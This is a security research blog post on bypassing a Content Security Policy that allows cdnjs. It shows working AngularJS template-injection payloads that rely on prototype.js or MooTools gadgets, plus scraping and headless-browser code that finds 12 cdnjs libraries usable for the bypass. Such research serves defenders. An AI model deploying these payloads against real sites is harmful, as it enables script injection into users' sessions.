---
title: Who pollutes your prototype? Find the libs on cdnjs in an automated way
catalog: true
date: 2022-09-01 19:31:10
tags: [Security]
categories: [Security]
translator: huli
photos: /img/angularjs-csp-bypass-cdnjs/cover-en.png
---

<img src="/img/angularjs-csp-bypass-cdnjs/cover-en.png" style="display:none">

When it comes to CSP bypass, a kind of technique using AngularJS is well-known. One of it's variant requires another library called `Prototype.js` to make it works.

After understanding how it works, I began to wonder if there are other libraries on cdnjs that can do similar things, so I started researching.

This article will start with the CSP bypass of cdnjs, talk about why prototype.js is needed, and then mention how I found its replacement on cdnjs.

<!-- more -->

## cdnjs + AngularJS CSP bypass

Putting `https://cdnjs.cloudflare.com` in the CSP is actually a very dangerous thing, because there is a way that many people know to bypass this CSP.

For details, please refer to these two articles:

1. [Bypassing path restriction on whitelisted CDNs to circumvent CSP protections - SECT CTF Web 400 writeup](https://blog.0daylabs.com/2016/09/09/bypassing-csp/)
2. [H5SC Minichallenge 3: "Sh*t, it's CSP!"](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it's-CSP!%22)

The bypass is as follows:

``` html
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>CSP bypass</title>
    <meta
      http-equiv="Content-Security-Policy"
      content="default-src 'none'; script-src https://cdnjs.cloudflare.com">
  </head>
  <body>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
    <div ng-app ng-csp>
      {{$on.curry.call().alert('xss')}}
    </div>
  </body>
</html>
```

I will explain how it works step by step.

First, because cdnjs is allowed in CSP, we can import any libraries hosting on cdn.js. Here we choose AngularJS so that we can use CSTI to inject the following HTML:

``` html
<div ng-app ng-csp>
  {{$on.curry.call().alert('xss')}}
</div>
```

What is `$on.curry.call()`? You can replace it with `window`, and you will find that it's not working. This is because the expression of AngularJS is scoped in a local object, and you cannot directly access window or properties on window.

Another important thing is that CSP does not contain `unsafe-eval`, so you can't directly do `constructor.constructor('alert(1)')()`.

As we can see from the result, `$on.curry.call()` seems to be equivalent to window, why is that? This is where prototype.js comes in handy, let's take a look at some of its source code:

``` js
function curry() {
  if (!arguments.length) return this;
  var __method = this, args = slice.call(arguments, 0);
  return function() {
    var a = merge(args, arguments);
    return __method.apply(this, a);
  }
}
```

This function will be added to `Function.prototype`, and we can focus on the first line: `if (!arguments.length) return this;`, if there is no parameter, it will return `this` directly. 

In JavaScript, if you use `call` or `apply` to call a function, the first parameter can specify the value of `this`, if not passed it will be the default value, in non-strict mode it is `window`.

This is why `$on.curry.call()` will be `window`, because `$on` is a function, so when `$on.curry.call()` is called without any parameters, `curry` function will return `this`, which is `window`, according to the conditional statement in the first line.

To summarize, the reason why AngularJS needs the help of prototype.js is because prototype.js:

1. Provides a function that added to the prototype
2. And this function will return `this`

The first point is very important, because as mentioned earlier, there is no way to access the `window` in the expression, but prototype.js puts things on the prototype, so it can be accessed through prototype.

The second point is also very important. We can access `window` because `this` is `window` by default when calling a function via `.call()` without providing `thisArg`.

After knowing how this works, you should know how to find a replacement, as long as you find one with the same function structure. 

I suddenly thought of an article I wrote before: [Don't break the Web: Take SmooshGate and keygen as examples](https://blog.huli.tw/2019/11/26/dont-break-web-smooshgate-and-keygen/), in which I mentioned that because MooTools is used to adding new things to the prototype, the method originally called `flatten` had to be renamed `flat`.

Will MooTools also meet our above conditions?

## Manually find alternatives - MooTools

We can find various prototypes modified by MooTools in this folder: https://github.com/mootools/mootools-core/tree/master/Source/Types

1. Array
2. DOMEvent
3. Function
4. Number
5. Object
6. String

Because the files are not large, you can read them one by one. If you want to be faster, you can also use `return this` as a keyword to search, and you can find two as soon as you search:

``` js
Array.implement({
  erase: function(item){
    for (var i = this.length; i--;){
      if (this[i] === item) this.splice(i, 1);
    }
    return this;
  },

  empty: function(){
    this.length = 0;
    return this;
  },
})
```


Both `Array.prototype.erase` and `Array.prototype.empty` functions return `this`, so the following two methods can get the `window`:

1. [].erase.call()
2. [].empty.call()

Then try it immediately to see if the CSP bypass is successful:

``` html
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>CSP bypass - MooTools</title>
    <meta
      http-equiv="Content-Security-Policy"
      content="default-src 'none'; script-src https://cdnjs.cloudflare.com">
  </head>
  <body>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
    <div ng-app ng-csp>
      {{[].erase.call().alert('xss')}}
    </div>
  </body>
</html>
```

After opening the file, the alert pop up! The bypass works.

It's time to think about how to automate it.

## Find the replacement in an automated way

A simple and intuitive automated process is probably:

1. Find all libraries on cdnjs
2. Find all JS files for each library
3. Use a headless browser (I use puppeteer) to test whether each JS adds a new property to the prototype
4. Try to call the new property to see if it will return window

Some of the details depend on how you want to deal with it. For example, if you want to be more precisely, you can test all versions of the library, but in that case, the amount of testing may increase by five to ten times.

I don't want to spent too much time on it, so I will use the latest version only.

In addition to finding a method that can return `this`, I also want to see which libraries will modidy your prototype, which can be known from the results of the third step.

## Find all libraries on cdnjs

I went to the cdnjs website to see how it works, I found that it called the API in algolia to fetch the list of libraries. Algolia provides a method to pull back all the data, but the api key of the official website does not support it, and paging is limited, only returns the first 1000 results.

So, I found the search API, assuming that there are no more than 1000 libraries starting with each letter, I can search for the libraries starting with each letter from `a-zA-Z0-9`, thereby bypassing the 1000 limitation.

The implementation of the code looks like this:

``` js
const axios = require('axios')
const fs = require('fs');

const API_HOST = 'https://2qwlvlxzb6-dsn.algolia.net/'
const SEARCH_API_URL = '/1/indexes/libraries/query'
const API_KEY = '2663c73014d2e4d6d1778cc8ad9fd010'
const APP_ID = '2QWLVLXZB6'

const instance = axios.create({
  baseURL: API_HOST,
  headers: {
    'x-algolia-api-key': API_KEY,
    'x-algolia-application-id': APP_ID
  }
})

const sleep = ms => new Promise(resolve => setTimeout(resolve, ms))

function write(content) {
  fs.writeFileSync('./data/libs.json', content)
}

async function main() {
  let chars = 'abcdefghijklmnopqrstuvwxyz0123456789'.split('')
  let allItems = []
  let existLib = {}
  for(let char of chars) {
    console.log(`fetching ${char}`)
    try {
      await sleep(500)
      const data = await getLibraries(char)
      const hits = data.hits
      console.log('length:', hits.length)

      const filtered = []
      for(let item of hits) {
        if (!existLib[item.name]) {
          filtered.push(item)
        }
        existLib[item.name] = true
      }
      allItems = allItems.concat(filtered)
      console.log('filtered length:', filtered.length)
      console.log('total length:', allItems.length)
      write(JSON.stringify(allItems, null, 2))
    } catch(err) {
      console.log('Error!')
      console.log(err, err.toString())
    }
  }
}

async function getLibraries(keyword) {
  const response = await instance.post(SEARCH_API_URL, {
        params: `query=${keyword}&page=0&hitsPerPage=1000`,
        restrictSearchableAttributes: [
          'name'
        ]
  })
  return response.data
}

main()

```

After running, we can get a list of all the cdnjs libraries with their names.

### Find all JS files for each library

The basic information of the library is placed in algolia, but some details are placed in cdnjs's own API.

The rules of this API are also very simple. The URL is: https://api.cdnjs.com/libraries/${package_name}/${version}, so we can get the details of every libraries.

``` js
const axios = require('axios')
const fs = require('fs');

const sleep = ms => new Promise(resolve => setTimeout(resolve, ms))

function write(content) {
  fs.writeFileSync('./data/libDetail.json', content)
}

if (!fs.existsSync('./data/libDetail.json')) {
  write('[]')
}

const existMap = {}
let detailItems = JSON.parse(fs.readFileSync('./data/libDetail.json', 'utf8'))
for(let item of detailItems) {  
  existMap[item.name] = true
}

async function getDetail(libName, version) {
  const url = `https://api.cdnjs.com/libraries/${encodeURIComponent(libName)}/${version}`
  try {
    const response = await axios(url)
    return response.data
  } catch(err) {
    console.log(url)
    console.log('failed:', libName, err.message)
    //process.exit(1)
  }
}

async function getLib(libraries, lib) {
  console.log('fetching:', lib.name)
  const detail = await getDetail(lib.name, lib.version)
  if (!detail) return
  detailItems.push(detail)
  write(JSON.stringify(detailItems, null, 2))
  console.log(`progress: ${detailItems.length}/${libraries.length}`)
}

async function getFiles() {
  const libraries = JSON.parse(fs.readFileSync('./data/libs.json', 'utf8'))
  for(let lib of libraries) {
    if (existMap[lib.name]) continue
    await sleep(200)
    getLib(libraries, lib)
  }
}

async function main() {
  getFiles()
}

main()
```

### Find the libraries we want

The list of packages is available, and the files for each package are also available. Moving on to our final step: finding eligible libraries.

There are more than 4000 libraries on cdnjs. If we run them one by one, we must run more than 4000 times. But in fact, there should be a few that meet our conditions, so I choose to run the test for every 10 libraries. 

If none of these 10 libraries have changed the prototype, then the next group, if any, use a binary search to find out which libraries have changed.

The HTML use for detection looks like this:

``` html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <script>
    function getPrototypeFunctions(prototype) {
      return Object.getOwnPropertyNames(prototype)
    }
    var protos = {
      array: getPrototypeFunctions(Array.prototype),
      string: getPrototypeFunctions(String.prototype),
      number: getPrototypeFunctions(Number.prototype),
      object: getPrototypeFunctions(Object.prototype),
      function: getPrototypeFunctions(Function.prototype)
    }
  </script>
</head>
<body>
  <!-- insert script here -->
  <script src="..."></script>
  <!-- insert script here -->
  <script>
    var newProtos = {
      array: getPrototypeFunctions(Array.prototype),
      string: getPrototypeFunctions(String.prototype),
      number: getPrototypeFunctions(Number.prototype),
      object: getPrototypeFunctions(Object.prototype),
      function: getPrototypeFunctions(Function.prototype)
    }
    let result = {
      prototypeFunctions: [],
      functionsReturnWindow: []
    }
    function check() {
      checkPrototype('array', 'Array.prototype', Array.prototype)
      checkPrototype('string', 'String.prototype', String.prototype)
      checkPrototype('number', 'Number.prototype', Number.prototype)
      checkPrototype('object', 'Object.prototype', Object.prototype)
      checkPrototype('function', 'Function.prototype', Function.prototype)
      return result
    }
    function checkPrototype(name, prototypeName, prototype) {
      const oldFuncs = protos[name]
      const newFuncs = newProtos[name]
      for(let fnName of newFuncs) {
        if (!oldFuncs.includes(fnName)) {
          const fullName = prototypeName + '.' + fnName
          result.prototypeFunctions.push(fullName)
          try {
            if (prototype[fnName].call() === window) {
              result.functionsReturnWindow.push(fullName)
            }
          } catch(err) {
          }
        }
      }
    }
  </script>
</body>
</html>
```

Before the library is loaded, we first record the properties on each prototype. After loading the library, we record it again and compare it with the previous one to find out which properties were added after the library was introduced. Then we can also divide the results into two types, one is the method added to the prototype, and the other is the function that meets our criteria.

The complete code is a bit longer, you can check it: https://github.com/aszx87410/cdnjs-prototype-pollution/blob/main/scan.js

But the process is roughly:

1. For every ten libraries, find the library that pollute the prototype
2. After finding the library, find out which files are polluting the prototype
3. Print out the results

## Result

Among the 4290 libraries, 74 (1.72%) libraries pollute your prototype. The list is as follows:

1. `6to5@3.6.5`
2. `Colors.js@1.2.4`
3. `Embetty@3.0.8`
4. `NicEdit@0.93`
5. `RGraph@606`
6. `ScrollTrigger@1.0.5`
7. `TableExport@5.2.0`
8. `ajv-async@1.0.1`
9. `angular-vertxbus@6.4.1`
10. `asciidoctor.js@1.5.9`
11. `aurelia-script@1.5.2`
12. `blendui@0.0.4`
13. `blissfuljs@1.0.6`
14. `bootstrap-calendar@0.2.5`
15. `carto.js@4.2.2`
16. `cignium-hypermedia-client@1.35.0`
17. `core-js@3.24.1`
18. `custombox@4.0.3`
19. `d3fc@11.0.0`
20. `d3plus@2.0.1`
21. `datejs@1.0`
22. `deb.js@0.0.2`
23. `defiant.js@2.2.7`
24. `eddy@0.7.0`
25. `ext-core@3.1.0`
26. `extjs@6.2.0`
27. `fs-tpp-api@2.4.4`
28. `highcharts@10.2.0`
29. `inheritance-js@0.4.12`
30. `jo@0.4.1`
31. `jquery-ajaxy@1.6.1`
32. `jquery-ui-bootstrap@0.5pre`
33. `js-bson@2.0.8`
34. `jslite@1.1.12`
35. `json-forms@1.6.3`
36. `keras-js@0.3.0`
37. `kwargsjs@1.0.1`
38. `leaflet.freedraw@2.0.1`
39. `lobipanel@1.0.6`
40. `melonjs@1.0.1`
41. `metro@4.4.3`
42. `mo@1.7.3`
43. `monet@0.9.3`
44. `mootools@1.6.0`
45. `oidc-client@1.11.5`
46. `opal@0.3.43`
47. `prototype@1.7.3`
48. `qcobjects@2.3.69`
49. `qoopido.demand@8.0.2`
50. `qoopido.js@3.7.4`
51. `qoopido.nucleus@3.2.15`
52. `quantumui@1.2.0`
53. `rantjs@1.0.6`
54. `rita@2.8.1`
55. `rivescript@2.2.0`
56. `scriptaculous@1.9.0`
57. `should.js@13.2.3`
58. `simple-gallery-js@1.0.3`
59. `simplecartjs@3.0.5`
60. `strapdown-topbar@1.6.4`
61. `string_score@0.1.22`
62. `survey-angular@1.9.45`
63. `survey-jquery@1.9.45`
64. `survey-knockout@1.9.45`
65. `survey-react@1.9.45`
66. `survey-vue@1.9.45`
67. `tablefilter@2.5.0`
68. `tmlib.js@0.5.2`
69. `tui-editor@1.4.10`
70. `typeis@1.1.2`
71. `uppy@3.0.0`
72. `vanta@0.5.22`
73. `waud.js@1.0.3`
74. `zui@1.10.0`

And of these 74 libraries, 12 (16.2%) meet our criteria, the list is as follows:

``` json
[
  {
    "url": "https://cdnjs.cloudflare.com/ajax/libs/asciidoctor.js/1.5.9/asciidoctor.min.js",
    "functions": [
      "Array.prototype.$concat",
      "Array.prototype.$push",
      "Array.prototype.$append",
      "Array.prototype.$rotate!",
      "Array.prototype.$shuffle!",
      "Array.prototype.$sort",
      "Array.prototype.$to_a",
      "Array.prototype.$to_ary",
      "Array.prototype.$unshift",
      "Array.prototype.$prepend",
      "String.prototype.$initialize",
      "String.prototype.$chomp",
      "String.prototype.$force_encoding",
      "Function.prototype.$to_proc"
    ]
  },
  {
    "url": "https://cdnjs.cloudflare.com/ajax/libs/jquery-ui-bootstrap/0.5pre/third-party/jQuery-UI-Date-Range-Picker/js/date.js",
    "functions": [
      "Number.prototype.milliseconds",
      "Number.prototype.millisecond",
      "Number.prototype.seconds",
      "Number.prototype.second",
      "Number.prototype.minutes",
      "Number.prototype.minute",
      "Number.prototype.hours",
      "Number.prototype.hour",
      "Number.prototype.days",
      "Number.prototype.day",
      "Number.prototype.weeks",
      "Number.prototype.week",
      "Number.prototype.months",
      "Number.prototype.month",
      "Number.prototype.years",
      "Number.prototype.year"
    ]
  },
  {
    "url": "https://cdnjs.cloudflare.com/ajax/libs/ext-core/3.1.0/ext-core.min.js",
    "functions": [
      "Function.prototype.createInterceptor"
    ]
  },
  {
    "url": "https://cdnjs.cloudflare.com/ajax/libs/datejs/1.0/date.min.js",
    "functions": [
      "Number.prototype.milliseconds",
      "Number.prototype.millisecond",
      "Number.prototype.seconds",
      "Number.prototype.second",
      "Number.prototype.minutes",
      "Number.prototype.minute",
      "Number.prototype.hours",
      "Number.prototype.hour",
      "Number.prototype.days",
      "Number.prototype.day",
      "Number.prototype.weeks",
      "Number.prototype.week",
      "Number.prototype.months",
      "Number.prototype.month",
      "Number.prototype.years",
      "Number.prototype.year"
    ]
  },
  {
    "url": "https://cdnjs.cloudflare.com/ajax/libs/json-forms/1.6.3/js/brutusin-json-forms.min.js",
    "functions": [
      "String.prototype.format"
    ]
  },
  {
    "url": "https://cdnjs.cloudflare.com/ajax/libs/inheritance-js/0.4.12/inheritance.min.js",
    "functions": [
      "Object.prototype.mix",
      "Object.prototype.mixDeep"
    ]
  },
  {
    "url": "https://cdnjs.cloudflare.com/ajax/libs/melonjs/1.0.1/melonjs.min.js",
    "functions": [
      "Array.prototype.remove"
    ]
  },
  {
    "url": "https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core-compat.min.js",
    "functions": [
      "Array.prototype.erase",
      "Array.prototype.empty",
      "Function.prototype.extend",
      "Function.prototype.implement",
      "Function.prototype.hide",
      "Function.prototype.protect"
    ]
  },
  {
    "url": "https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js",
    "functions": [
      "Array.prototype.erase",
      "Array.prototype.empty",
      "Function.prototype.extend",
      "Function.prototype.implement",
      "Function.prototype.hide",
      "Function.prototype.protect"
    ]
  },
  {
    "url": "https://cdnjs.cloudflare.com/ajax/libs/opal/0.3.43/opal.min.js",
    "functions": [
      "Array.prototype.$extend",
      "Array.prototype.$to_proc",
      "Array.prototype.$to_a",
      "Array.prototype.$collect!",
      "Array.prototype.$delete_if",
      "Array.prototype.$each_index",
      "Array.prototype.$fill",
      "Array.prototype.$insert",
      "Array.prototype.$keep_if",
      "Array.prototype.$map!",
      "Array.prototype.$push",
      "Array.prototype.$shuffle",
      "Array.prototype.$to_ary",
      "Array.prototype.$unshift",
      "String.prototype.$as_json",
      "String.prototype.$extend",
      "String.prototype.$intern",
      "String.prototype.$to_sym",
      "Number.prototype.$as_json",
      "Number.prototype.$extend",
      "Number.prototype.$to_proc",
      "Number.prototype.$downto",
      "Number.prototype.$nonzero?",
      "Number.prototype.$ord",
      "Number.prototype.$times",
      "Function.prototype.$include",
      "Function.prototype.$module_function",
      "Function.prototype.$extend",
      "Function.prototype.$to_proc"
    ]
  },
  {
    "url": "https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.3/prototype.min.js",
    "functions": [
      "Array.prototype.clear",
      "Number.prototype.times",
      "Function.prototype.curry"
    ]
  },
  {
    "url": "https://cdnjs.cloudflare.com/ajax/libs/tmlib.js/0.5.2/tmlib.min.js",
    "functions": [
      "Array.prototype.swap",
      "Array.prototype.eraseAll",
      "Array.prototype.eraseIf",
      "Array.prototype.eraseIfAll",
      "Array.prototype.clear",
      "Array.prototype.shuffle",
      "Number.prototype.times",
      "Number.prototype.upto",
      "Number.prototype.downto",
      "Number.prototype.step",
      "Object.prototype.$extend",
      "Object.prototype.$safe",
      "Object.prototype.$strict"
    ]
  }
]
```

Besides prototype.js, we have 11 other libraries that can be used.

## Conclusion

By grabbing all the library information on cdnjs and using the headless browser to help verify, we have successfully found 11 alternatives to prototype.js. These libraries will add new methods on the prototype, and those methods will return `this` after calling it.

It took me a day or two to make this tiny project, because the data format is relatively simple, the verification method is also very simple, and the number is not really much. If you want to speed up, you can open a few more threads to run.

By the way, finding a replacement is mostly for fun, because it doesn't make sense for a server to block `prototype.js` in particular(unless it's a [XSS challenge](https://challenge-0822.intigriti.io/)).

Anyway, even it's not that useful, it's still a good and fun experience to do such research. At least, we know who pollues our prototype now.

Source code is available on GitHub: https://github.com/aszx87410/cdnjs-prototype-pollution
